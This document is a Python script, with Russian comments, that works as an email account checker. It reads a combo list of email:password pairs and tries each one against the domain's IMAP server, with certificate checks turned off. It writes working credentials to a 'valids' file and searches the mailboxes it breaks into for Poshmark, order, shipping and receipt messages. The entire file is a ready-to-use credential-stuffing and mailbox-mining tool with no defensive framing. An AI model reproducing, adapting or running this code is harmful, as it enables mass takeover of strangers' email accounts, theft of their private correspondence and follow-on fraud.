import sqlite3
import imaplib
import email
from email.header import decode_header
import os
import ssl
import socket

DB_PATH = "/home/raw/prosch/web/app/imapdatabase.db"
VALIDS_PATH = "/home/raw/prosch/web/app/valids.txt"

def get_imap(email_addr: str) -> dict | None:
    email_addr = email_addr.strip().lower()
    if "@" not in email_addr: return {"error": "Некорректный email"}
    domain = email_addr.split("@")[-1]
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    # Оптимизированный поиск (сначала точный домен, потом LIKE)
    for table in '0123456789ABCDEF':
        cursor.execute(f'SELECT Server, Port, Socket FROM "{table}" WHERE Server = ? OR Server = ? LIMIT 1', 
                       (domain, f"imap.{domain}"))
        row = cursor.fetchone()
        if row:
            server, port, socket_type = row
            conn.close()
            return {"domain": domain, "imap": server.strip().rstrip("."), "imap_port": port, "ssl": socket_type == 0}
    conn.close()
    return None

def connect_imap(email_addr: str, password: str):
    settings = get_imap(email_addr)
    if not settings or "error" in settings:
        print(f"❌ Настройки не найдены для {email_addr}")
        return None

    # "Мягкий" SSL контекст для старых серверов
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.set_ciphers('DEFAULT@SECLEVEL=1')

    print(f"📡 Подключаемся к {settings['imap']}:{settings['imap_port']} (SSL: {settings['ssl']})")
    
    try:
        if settings["ssl"]:
            mail = imaplib.IMAP4_SSL(settings["imap"], settings["imap_port"], ssl_context=context, timeout=15)
        else:
            mail = imaplib.IMAP4(settings["imap"], settings["imap_port"], timeout=15)
            try:
                # ВАЖНО: передаем контекст в STARTTLS
                mail.starttls(ssl_context=context)
            except: pass
            
        mail.login(email_addr, password)
        print(f"✅ Успешно вошли: {email_addr}")
        
        # Сохраняем валид
        with open(VALIDS_PATH, 'a', encoding='utf-8') as f:
            f.write(f"{email_addr}:{password}\n")
            
        return mail
    except Exception as e:
        print(f"❌ Ошибка соединения/авторизации: {e}")
    return None

def find_emails(mail, keywords: list):
    """Ищет письма по списку ключевых слов в заголовках и отправителе"""
    try:
        status, folder_list = mail.list()
        found_any = False

        for f in folder_list:
            folder_name = f.decode().split('"/"')[-1].strip().strip('"')
            res, _ = mail.select(f'"{folder_name}"', readonly=True)
            if res != "OK": continue

            for word in keywords:
                # Ищем и по отправителю, и по теме письма (OR SUBJECT)
                search_query = f'(OR FROM "{word}" SUBJECT "{word}")'
                status, data = mail.search(None, search_query)
                ids = data[0].split()
                
                if ids:
                    print(f"  ✨ Найдено {len(ids)} шт. ('{word}') в папке '{folder_name}'")
                    found_any = True
                    # Выведем инфу о самом последнем
                    fetch_and_print_msg(mail, ids[-1])
        
        if not found_any:
            print(f"❌ Ничего интересного не найдено.")
    except Exception as e:
        print(f"⚠️ Ошибка при поиске: {e}")

def fetch_and_print_msg(mail, msg_id):
    """Вспомогательная функция для парсинга письма"""
    _, data = mail.fetch(msg_id, "(RFC822)")
    msg = email.message_from_bytes(data[0][1])
    subject, enc = decode_header(msg["Subject"])[0]
    if isinstance(subject, bytes): subject = subject.decode(enc or "utf-8", errors="ignore")
    print(f"    📝 Тема: {subject} | От: {msg['From']}")

def process_accounts_from_file(filepath: str, keywords: list):
    if not os.path.exists(filepath): return
    with open(filepath, 'r', encoding='utf-8') as file:
        for line in file:
            line = line.strip()
            if not line or ':' not in line: continue
            
            email_addr, password = line.split(':', 1)
            print(f"\n{'='*60}\n⏳ Проверка: {email_addr.strip()}")
            
            client = connect_imap(email_addr.strip(), password.strip())
            if client:
                find_emails(client, keywords)
                try: client.logout()
                except: pass

if __name__ == "__main__":
    ACCOUNTS_FILE = "/home/raw/prosch/web/app/mix.txt"
    # Расширенный список поиска
    SEARCH_KEYWORDS = ["poshmark", "order", "shipping", "delivery", "receipt"]
    
    process_accounts_from_file(ACCOUNTS_FILE, SEARCH_KEYWORDS)